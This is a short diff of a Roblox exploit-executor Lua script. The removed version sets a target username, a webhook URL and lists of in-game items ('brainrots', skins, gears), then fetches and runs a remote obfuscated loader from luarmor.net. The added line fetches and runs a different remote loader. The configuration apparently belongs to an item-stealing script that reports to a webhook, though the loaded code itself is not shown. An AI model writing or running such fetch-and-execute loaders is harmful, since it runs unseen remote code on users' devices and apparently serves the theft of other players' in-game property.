@@ -1,10 +1,1 @@
--- Mode: NORMAL
-getgenv().TARGET_USERNAME = "void"
-getgenv().WEBHOOK_URL = "qrqq"
-getgenv().NORMAL_BRAINROTS = {}
-getgenv().NORMAL_BASE_SKINS = {}
-getgenv().NORMAL_GEARS = {}
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
-end)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7a0d8737f9f36b35d485fb0e0c74d249.lua"))()
